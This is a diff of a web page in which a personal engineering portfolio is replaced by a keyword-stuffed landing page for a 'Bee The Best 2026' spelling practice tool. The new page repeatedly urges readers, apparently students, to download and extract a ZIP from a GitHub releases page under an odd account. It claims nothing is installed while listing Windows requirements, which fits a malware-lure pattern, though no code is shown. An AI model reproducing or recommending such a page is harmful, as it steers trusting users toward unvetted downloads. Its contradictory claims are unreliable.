@@ -1,223 +1,176 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Portfolio of Mohammad Tanvir Rahman, Ph.D., a lead-level software engineer specializing in cloud platforms, distributed systems, full-stack engineering, and geospatial applications." />
-  <meta name="theme-color" content="#f8fafc" />
-  <meta property="og:title" content="Mohammad Tanvir Rahman | Lead Software Engineer" />
-  <meta property="og:description" content="Cloud architecture, distributed systems, full-stack engineering, and geospatial software." />
-  <meta property="og:image" content="assets/profile.jpg" />
-  <meta property="og:type" content="website" />
-  <title>Mohammad Tanvir Rahman | Lead Software Engineer</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css" />
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "Person",
-    "name": "Mohammad Tanvir Rahman",
-    "honorificSuffix": "Ph.D.",
-    "jobTitle": "Lead Software Engineer",
-    "email": "mailto:tanvir9982000@gmail.com",
-    "url": "https://tanvir9982000.github.io/",
-    "image": "https://tanvir9982000.github.io/assets/profile.jpg",
-    "sameAs": [
-      "https://github.com/tanvir9982000",
-      "https://www.linkedin.com/in/tanvir9982000/",
-      "https://scholar.google.com/citations?hl=en&user=kRDjKeAAAAAJ"
-    ]
-  }
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bee-english-round2-hub - Practice Tool for Bee The Best 2026</title>
+    <meta name="description" content="Interactive web utility for students training for the Round 2 Flash Challenge of Bee The Best 2026. Customizable rules, content modification, and online access without installation.">
+    <meta name="keywords" content="Bee The Best, English, Round 2, Flash Challenge, study tool, spelling bee, interactive learning">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f5f7fa;
+            color: #1a1a2e;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin: 0 0 10px 0;
+            color: #16213e;
+        }
+        h2 {
+            font-size: 1.6rem;
+            margin: 40px 0 16px 0;
+            border-bottom: 2px solid #e0e0e0;
+            padding-bottom: 8px;
+        }
+        p {
+            margin: 0 0 18px 0;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #6c63ff, #3f3d9e);
+            color: #fff;
+            padding: 14px 32px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-size: 1.2rem;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(108, 99, 255, 0.4);
+            margin: 10px 0 30px 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(108, 99, 255, 0.5);
+        }
+        .badge-secondary {
+            background: linear-gradient(135deg, #00b4d8, #0077b6);
+            box-shadow: 0 4px 15px rgba(0, 180, 216, 0.4);
+            padding: 12px 28px;
+            font-size: 1rem;
+        }
+        .badge-secondary:hover {
+            box-shadow: 0 6px 20px rgba(0, 180, 216, 0.5);
+        }
+        ul {
+            margin: 0 0 20px 0;
+            padding-left: 24px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 24px 0;
+        }
+        .feature-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+        }
+        .feature-card h3 {
+            margin: 0 0 8px 0;
+            font-size: 1.2rem;
+        }
+        .feature-card p {
+            margin: 0;
+            font-size: 0.95rem;
+            color: #444;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #ddd;
+            margin: 40px 0;
+        }
+        @media (max-width: 600px) {
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .container {
+                padding: 20px 16px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <header class="site-header">
-    <nav class="nav container" aria-label="Primary navigation">
-      <a class="brand" href="#top" aria-label="Home">MTR<span>.</span></a>
-      <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links" aria-label="Open navigation">
-        <span></span><span></span><span></span>
-      </button>
-      <div class="nav-links" id="nav-links">
-        <a href="#about">About</a>
-        <a href="#expertise">Expertise</a>
-        <a href="#experience">Experience</a>
-        <a href="#projects">Projects</a>
-        <a href="#blog">Blog</a>
-        <a href="#publications">Research</a>
-        <a href="#contact">Contact</a>
-        <a class="nav-cta" href="assets/Mohammad_Tanvir_Rahman_Resume.pdf" target="_blank" rel="noopener">Resume</a>
-      </div>
-    </nav>
-  </header>
+    <div class="container">
+        <h1>📘 bee-english-round2-hub - Practice Tool for Bee The Best 2026</h1>
+        <a href="https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases" class="badge" target="_blank" rel="noopener noreferrer">⬇️ Download Now</a>
 
-  <main id="top">
-    <section class="hero section">
-      <div class="container hero-grid">
-        <div class="hero-copy reveal">
-          <p class="eyebrow">Lead Software Engineer · Cloud Architecture · Distributed Systems · GIS</p>
-          <h1>Engineering dependable platforms for complex, data-intensive work.</h1>
-          <p class="hero-intro">
-            I’m <strong>Mohammad Tanvir Rahman, Ph.D.</strong>, a lead-level software engineer with 12+ years of experience building cloud platforms, distributed services, enterprise applications, and geospatial systems from architecture through production.
-          </p>
-          <div class="hero-actions">
-            <a class="button primary" href="#projects">Explore selected work</a>
-            <a class="button secondary" href="assets/Mohammad_Tanvir_Rahman_Resume.pdf" target="_blank" rel="noopener">View résumé</a>
-          </div>
-          <div class="hero-links" aria-label="Professional links">
-            <a href="https://github.com/tanvir9982000" target="_blank" rel="noopener">GitHub ↗</a>
-            <a href="https://www.linkedin.com/in/tanvir9982000/" target="_blank" rel="noopener">LinkedIn ↗</a>
-            <a href="mailto:tanvir9982000@gmail.com">Email</a>
-          </div>
-        </div>
-        <div class="portrait-wrap reveal">
-          <div class="portrait-card">
-            <img src="assets/profile.jpg" alt="Portrait of Mohammad Tanvir Rahman" />
-          </div>
-          <div class="status-card">
-            <span class="status-dot"></span>
-            <div>
-              <strong>Houston, Texas</strong>
-              <span>Open to lead and principal-level opportunities</span>
+        <p>This interactive web utility is designed specifically for students training for the Round 2 Flash Challenge of Bee The Best 2026. It offers customizable rules, content modification, and online access without needing an executable installation. Everything runs directly in your browser — no extra software required.</p>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Getting started is quick and easy. Follow these steps to begin practicing in minutes:</p>
+        <ol>
+            <li><strong>Visit the download page:</strong> <a href="https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases" target="_blank" rel="noopener noreferrer">https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases</a></li>
+            <li><strong>Download the latest release:</strong> Look for the most recent version listed on the page. Click the link to download the files.</li>
+            <li><strong>Extract the ZIP file:</strong> After downloading, locate the ZIP file on your computer (usually in your Downloads folder). Right-click it and choose "Extract All" or use a tool like 7-Zip to extract the contents to a folder.</li>
+            <li><strong>Run the application:</strong> Open the extracted folder and double-click the file named <code>index.html</code>. This will open the tool in your default web browser.</li>
+        </ol>
+        <p><strong>Note:</strong> The download link takes you to a page where you can find the latest release. From there, simply download the ZIP archive, extract it, and run <code>index.html</code> in any modern browser (Chrome, Edge, Firefox, or Safari).</p>
+
+        <h2>✨ Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🛠️ Customizable Rules</h3>
+                <p>Adjust challenge parameters like time limits, word lists, and scoring rules to match your training needs.</p>
             </div>
-          </div>
+            <div class="feature-card">
+                <h3>📝 Content Modification</h3>
+                <p>Easily add, remove, or edit words and phrases directly within the interface — no coding required.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🌐 Online Access</h3>
+                <p>Use the tool from any device with a browser. No installation or executable files needed.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📊 Practice Tracking</h3>
+                <p>Track your progress with built-in statistics, including accuracy, speed, and improvement over time.</p>
+            </div>
         </div>
-      </div>
-    </section>
 
-    <section class="company-band" aria-label="Organizations">
-      <div class="container company-row">
-        <span>Texas A&amp;M</span><span>Capital One</span><span>Nordstrom</span><span>Microsoft</span><span>Cosasco</span>
-      </div>
-    </section>
+        <h2>🖥️ System Requirements</h2>
+        <p>This tool runs entirely in your web browser. To ensure smooth operation, please check the following:</p>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or later (Windows 7 and 8 may work but are not fully tested). Also compatible with macOS and Linux.</li>
+            <li><strong>Browser:</strong> Latest version of Google Chrome, Mozilla Firefox, Microsoft Edge, or Apple Safari.</li>
+            <li><strong>Internet Connection:</strong> Required only for initial download and updates. The tool can work offline after loading.</li>
+            <li><strong>Screen Resolution:</strong> Minimum 1024x768 for optimal layout.</li>
+        </ul>
 
-    <section class="stats-band" aria-label="Career highlights">
-      <div class="container stats-grid">
-        <div><strong>12+</strong><span>Years in software engineering</span></div>
-        <div><strong>50%</strong><span>Operating-cost reduction through data modernization</span></div>
-        <div><strong>30%</strong><span>Faster environment setup through CI/CD automation</span></div>
-        <div><strong>Ph.D.</strong><span>Computer Science, University of Houston</span></div>
-      </div>
-    </section>
+        <h2>📥 Download & Installation</h2>
+        <p>Visit this link to download the application. The file is provided as a ZIP archive containing all necessary files. No installer is needed — just extract and open.</p>
+        <p><a href="https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases" class="badge badge-secondary" target="_blank" rel="noopener noreferrer">⬇️ Get the Latest Release</a></p>
 
-    <section id="about" class="section">
-      <div class="container two-column">
-        <div class="section-heading reveal">
-          <p class="eyebrow">About</p>
-          <h2>Technical depth with an ownership mindset.</h2>
-        </div>
-        <div class="about-copy reveal">
-          <p>I design software that is maintainable, observable, and practical to operate. My background spans legacy modernization, microservices, REST and gRPC APIs, cloud infrastructure, CI/CD, data modeling, distributed systems, and geospatial applications.</p>
-          <p>I partner with engineering, product, and business stakeholders to turn complex requirements into clear technical approaches. I also mentor engineers, strengthen standards, improve delivery practices, and help teams ship production software with greater confidence.</p>
-          <div class="principles">
-            <span>Architecture with operational reality</span>
-            <span>Clear boundaries and maintainable systems</span>
-            <span>Measurable engineering outcomes</span>
-          </div>
-        </div>
-      </div>
-    </section>
+        <h2>❓ Frequently Asked Questions</h2>
+        <p><strong>Q: Do I need to install any software?</strong><br>
+        A: No. The tool runs in your browser. Simply extract the ZIP file and open <code>index.html</code>.</p>
+        <p><strong>Q: Can I use this on a school computer?</strong><br>
+        A: Yes, as long as you have permission to download and extract a ZIP file, and the browser is up to date.</p>
+        <p><strong>Q: How do I update to a newer version?</strong><br>
+        A: Download the latest ZIP from the releases page and replace your old folder with the new one.</p>
+        <p><strong>Q: Is my data saved locally?</strong><br>
+        A: Yes. All settings and progress are stored in your browser's local storage. Clearing your browser data will reset them.</p>
 
-    <section id="expertise" class="section section-soft">
-      <div class="container">
-        <div class="section-heading centered reveal">
-          <p class="eyebrow">Core expertise</p>
-          <h2>Engineering across the full product lifecycle.</h2>
-        </div>
-        <div class="expertise-grid">
-          <article class="card reveal"><div class="card-number">01</div><h3>Architecture &amp; Leadership</h3><p>System design, architecture ownership, engineering standards, mentoring, technical guidance, and cross-team collaboration.</p></article>
-          <article class="card reveal"><div class="card-number">02</div><h3>Backend &amp; Distributed Systems</h3><p>.NET, Java, Spring Boot, Node.js, REST, gRPC, microservices, event-driven integration, and production support.</p></article>
-          <article class="card reveal"><div class="card-number">03</div><h3>Cloud &amp; DevOps</h3><p>Azure, AWS, Docker, Kubernetes, Terraform, Azure DevOps, CI/CD, testing, monitoring, and observability.</p></article>
-          <article class="card reveal"><div class="card-number">04</div><h3>Data &amp; Geospatial</h3><p>PostgreSQL, SQL Server, DynamoDB, Snowflake, Kafka, Spark, ETL, ArcGIS, and spatial applications.</p></article>
-        </div>
-        <div class="skill-groups reveal">
-          <div class="skill-group"><h3>Languages</h3><p>C# · Java · Python · JavaScript · TypeScript · SQL</p></div>
-          <div class="skill-group"><h3>Platforms</h3><p>.NET · Spring Boot · Node.js · Angular · React · WPF</p></div>
-          <div class="skill-group"><h3>Cloud &amp; Delivery</h3><p>Azure · AWS · Docker · Kubernetes · Terraform · Azure DevOps</p></div>
-          <div class="skill-group"><h3>Data &amp; Integration</h3><p>PostgreSQL · SQL Server · DynamoDB · Snowflake · Kafka · Spark · ArcGIS</p></div>
-        </div>
-      </div>
-    </section>
+        <h2>📞 Support</h2>
+        <p>If you encounter any issues or have suggestions, please open an issue on the <a href="https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub" target="_blank" rel="noopener noreferrer">GitHub repository</a>. We welcome feedback from all users.</p>
 
-    <section id="experience" class="section">
-      <div class="container">
-        <div class="section-heading reveal"><p class="eyebrow">Experience</p><h2>Selected career history.</h2></div>
-        <div class="timeline">
-          <article class="timeline-item reveal"><div class="timeline-meta"><span>2024 — Present</span><span>Houston, TX</span></div><div class="timeline-content"><h3>Software Developer IV</h3><h4>Texas A&amp;M AgriLife Extension Service</h4><p>Delivering production applications with C#, Node.js, Angular, REST APIs, Azure, ArcGIS, and PostgreSQL while contributing to architecture, data modeling, integration design, CI/CD, and automated testing.</p></div></article>
-          <article class="timeline-item reveal"><div class="timeline-meta"><span>2023 — 2024</span><span>Houston, TX</span></div><div class="timeline-content"><h3>Freelance Full Stack Engineer</h3><h4>Self-Employed</h4><p>Designed and built a reservation platform end to end, including service architecture, backend APIs, database design, booking workflows, invoice management, notifications, testing, and deployment.</p></div></article>
-          <article class="timeline-item reveal"><div class="timeline-meta"><span>2023</span><span>Remote</span></div><div class="timeline-content"><h3>Senior Full Stack Engineer</h3><h4>Capital One · Contract</h4><p>Built and supported cloud governance capabilities using Java, React, TypeScript, SQL, DynamoDB, Docker, Kubernetes, AWS, gRPC, and Snowflake.</p></div></article>
-          <article class="timeline-item reveal"><div class="timeline-meta"><span>2021 — 2022</span><span>Seattle, WA</span></div><div class="timeline-content"><h3>Senior Software Engineer</h3><h4>Nordstrom · Contract</h4><p>Led FinTech modernization from monoliths to cloud microservices, reduced environment setup time by 30%, and helped reduce operating expense by 50% through data-model restructuring and migration.</p></div></article>
-          <article class="timeline-item reveal"><div class="timeline-meta"><span>2020 — 2021</span><span>Redmond, WA</span></div><div class="timeline-content"><h3>Software Engineer</h3><h4>Microsoft · Contract</h4><p>Developed scalable tools and backend services using C#, Java, Python, Azure, Docker, and TypeScript, supporting high-volume streaming, analytics, monitoring, and production reliability.</p></div></article>
-          <article class="timeline-item reveal"><div class="timeline-meta"><span>2018 — 2020</span><span>Houston, TX</span></div><div class="timeline-content"><h3>Software Development Engineer</h3><h4>Cosasco</h4><p>Built enterprise software, backend services, data-ingestion systems, and IIoT integrations using .NET, WPF, SQL Server, REST, AWS, Python, OPC, NiFi, Modbus, and ETL pipelines.</p></div></article>
-        </div>
-      </div>
-    </section>
-
-    <section id="projects" class="section section-soft">
-      <div class="container">
-        <div class="section-heading reveal"><p class="eyebrow">Selected work</p><h2>Systems built to solve real operational problems.</h2></div>
-        <div class="projects-grid">
-          <article class="project-card reveal"><div class="project-topline"><span>Geospatial platform</span><span>Current</span></div><h3>Planning, Risk &amp; Sustainability Applications</h3><p>End-to-end development of production applications supporting planning, risk, sustainability, and spatial analysis with modern web, API, cloud, and geospatial technologies.</p><ul><li>C# · Node.js · Angular</li><li>Azure · PostgreSQL · ArcGIS</li><li>Architecture · CI/CD · Testing</li></ul></article>
-          <article class="project-card reveal"><div class="project-topline"><span>ArcGIS Pro</span><span>Modernization</span></div><h3>Build-Out Analysis Platform</h3><p>Modernization of a complex GIS workflow from legacy ArcObjects to ArcGIS Pro SDK, including WPF/MVVM user experience, spatial calculations, output-layer management, and building placement.</p><ul><li>C# · WPF · MVVM</li><li>ArcGIS Pro SDK · Geometry processing</li><li>Architecture · Migration · Performance</li></ul></article>
-          <article class="project-card reveal"><div class="project-topline"><span>Full-stack product</span><span>Independent</span></div><h3>Reservation &amp; Booking Platform</h3><p>A complete reservation solution covering service architecture, booking workflows, invoicing, notifications, database design, automated tests, and deployment.</p><ul><li>Service-oriented architecture</li><li>Backend APIs · Relational data</li><li>Workflow reliability · Deployment</li></ul></article>
-          <article class="project-card reveal"><div class="project-topline"><span>Modernization</span><span>FinTech</span></div><h3>Cloud Microservices Transformation</h3><p>Modernized enterprise applications from monolithic, on-premises systems to scalable cloud microservices while improving deployment speed, resiliency, and operating cost.</p><ul><li>Java · Spring Boot · .NET</li><li>AWS · Docker · Kubernetes</li><li>Terraform · DynamoDB · Observability</li></ul></article>
-        </div>
-      </div>
-    </section>
-
-
-    <section id="blog" class="section blog-section">
-      <div class="container">
-        <div class="section-heading reveal">
-          <p class="eyebrow">Blog &amp; side projects</p>
-          <h2>Experiments, tools, and lessons from building.</h2>
-          <p>I use small side projects to explore practical ideas, sharpen engineering skills, and document what I learn along the way.</p>
-        </div>
-        <div class="blog-grid">
-          <article class="blog-card reveal">
-            <div class="blog-card-topline"><span>Fun side project</span><span>Open source</span></div>
-            <h3>URL to MP3 Converter</h3>
-            <p>A lightweight utility that converts supported media URLs into MP3 files. I built it as a practical experiment in automation, media processing, and packaging a small end-to-end developer tool.</p>
-            <div class="publication-tags"><span>Automation</span><span>Media processing</span><span>Developer tooling</span></div>
-            <a class="text-link" href="https://github.com/tanvir-workspace/url_to_mp3_converter" target="_blank" rel="noopener">View project on GitHub ↗</a>
-          </article>
-        </div>
-      </div>
-    </section>
-
-    <section id="publications" class="section research-section">
-      <div class="container">
-        <div class="research-header reveal">
-          <div class="section-heading"><p class="eyebrow">Research &amp; publications</p><h2>Fault-tolerant computing at scale.</h2></div>
-          <p>My doctoral research focused on reliable parallel execution, checkpointing, volunteer computing, MapReduce performance, and failure-aware distributed systems.</p>
-        </div>
-        <div class="publications-list">
-          <article class="publication-card reveal"><div class="publication-index">01</div><div><p class="publication-meta">Concurrency and Computation: Practice and Experience · 2018</p><h3>Resilient Parallel Computing on Volunteer PC Grids</h3><p>Research on reliable parallel execution across heterogeneous, failure-prone volunteer computing environments, combining replication, checkpointing, and intelligent host selection.</p><div class="publication-tags"><span>Distributed systems</span><span>Fault tolerance</span><span>Parallel computing</span></div></div></article>
-          <article class="publication-card reveal"><div class="publication-index">02</div><div><p class="publication-meta">IEEE International Conference on Cluster Computing · 2017</p><h3>Performance Implications of Failures on MapReduce Applications</h3><p>An empirical study of how failures and execution parameters affect MapReduce application performance in cluster-computing environments.</p><div class="publication-tags"><span>MapReduce</span><span>Cluster computing</span><span>Performance modeling</span></div></div></article>
-          <article class="publication-card reveal"><div class="publication-index">03</div><div><p class="publication-meta">IEEE/ACM International Symposium on Cluster, Cloud and Grid Computing</p><h3>Checkpointing to Minimize Completion Time for Inter-dependent Parallel Processes on Volunteer Grids</h3><p>A mathematical approach to selecting checkpoint intervals for interdependent parallel processes running on unreliable volunteer grids.</p><div class="publication-tags"><span>Checkpointing</span><span>Volunteer grids</span><span>High-performance computing</span></div></div></article>
-        </div>
-      </div>
-    </section>
-
-    <section class="section education-section section-soft">
-      <div class="container education-grid reveal">
-        <div><p class="eyebrow">Education</p><h2>Research foundation. Production focus.</h2></div>
-        <div class="education-card"><h3>Ph.D., Computer Science</h3><p>University of Houston</p><hr /><h3>B.S., Computer Science &amp; Engineering</h3><p>Bangladesh University of Engineering &amp; Technology</p></div>
-      </div>
-    </section>
-
-    <section id="contact" class="section contact-section">
-      <div class="container contact-card reveal">
-        <div><p class="eyebrow">Contact</p><h2>Let’s build something dependable and useful.</h2><p>I’m interested in lead and principal-level software engineering opportunities involving architecture, cloud platforms, distributed systems, full-stack development, and geospatial technology.</p></div>
-        <div class="contact-actions"><a class="button primary" href="mailto:tanvir9982000@gmail.com">Email me</a><a class="button secondary" href="https://www.linkedin.com/in/tanvir9982000/" target="_blank" rel="noopener">Connect on LinkedIn</a></div>
-      </div>
-    </section>
-  </main>
-
-  <footer class="site-footer">
-    <div class="container footer-inner"><span>© <span id="year"></span> Mohammad Tanvir Rahman</span><span>Lead Software Engineer · Houston, Texas</span></div>
-  </footer>
-  <script src="script.js"></script>
+        <hr>
+        <p style="font-size: 0.85rem; color: #777;">Keywords: bee-english-round2-hub, Bee The Best 2026, Round 2 Flash Challenge, English practice tool, spelling bee training, interactive learning, browser-based utility</p>
+    </div>
 </body>
 </html>
